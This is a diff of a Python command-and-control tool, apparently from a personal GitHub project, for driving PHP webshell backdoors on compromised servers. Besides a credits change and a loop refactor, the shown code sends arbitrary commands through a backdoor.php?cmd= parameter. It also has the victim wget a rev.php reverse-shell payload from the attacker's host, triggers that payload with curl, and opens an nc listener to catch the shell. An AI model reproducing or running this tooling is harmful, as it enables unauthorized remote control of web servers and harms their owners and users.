@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Generate/Interface With PHP Webshells/Backdoors
 # Setup Listeners to Receive Reverse Shells Via PHP
-# Author: Jessi
+# Authors: Jessi and Rin
 # Usage: ./php-c2.py
 
 import requests
@@ -24,7 +24,7 @@ print("""\
    (___()                                      \)   \) -hh  \) (/""")
 print("PHP C2 Framework")
 time.sleep(1)
-print("Written By. Jessi")
+print("Written By: Jessi and Rin")
 time.sleep(1)
 print("Github: jessisec")
 print("Twitter: @jessitakes")
@@ -39,8 +39,6 @@ def bg_http_server():
 
 # Send Reverse Shell Payload Task
 def send_payload(url,lhost):
-    url = url
-    lhost = lhost
     requests.get(url + 'rm rev.php')
     cmd = 'wget http://' + lhost+'/rev.php'
     send_payload = url + cmd
@@ -51,18 +49,15 @@ def rev_payload(url):
     rshell = url.replace('backdoor.php?cmd=', 'rev.php')
     os.system("curl "+ rshell+" &")
 def bg_rev_payload(url):
-    url = url
     threading.Thread(target=rev_payload(url)).start()
 
 # Services
 def listener(lport):
-    lport = lport
     print("Starting listener...")
     os.system("nc -lvnp " + lport+"")
 
 # PHP Backdoor -> Reverse Shell Upgrade Task
 def upgrade(url):
-    url = url
     lhost = input("LHOST: ")
     lport = input("LPORT: ")
     print("Attempting Shell Upgrade...")
@@ -84,24 +79,24 @@ def upgrade(url):
 
 # Define Option 1: PHP Backdoor Shell
 def opt1(url,ip):
-    cmd = input("php-c2@" + ip+"$ ")
-    if cmd == "clear":
-        os.system("clear")
-        print("[PHP Backdoor C2]")
-        print("\n")
-    elif cmd == "exit":
-        exit(0)
-    elif cmd == "php-bg":
-        exit(0)
-    elif cmd == "php-menu":
-        menu()
-    elif cmd == "php-upgrade":
-        upgrade(url)
-    shell = url + cmd
-    r = requests.get(shell)
-    output = r.text
-    print(output)
-    opt1(url,ip)
+    while(True):
+        cmd = input("php-c2@" + ip+"$ ")
+        if cmd == "clear":
+            os.system("clear")
+            print("[PHP Backdoor C2]")
+            print("\n")
+        elif cmd == "exit":
+            exit(0)
+        elif cmd == "php-bg":
+            exit(0)
+        elif cmd == "php-menu":
+            menu()
+        elif cmd == "php-upgrade":
+            upgrade(url)
+        shell = url + cmd
+        r = requests.get(shell)
+        output = r.text
+        print(output)
 
 # Define Option 2: PHP Reverse Shell C2
 def opt2():
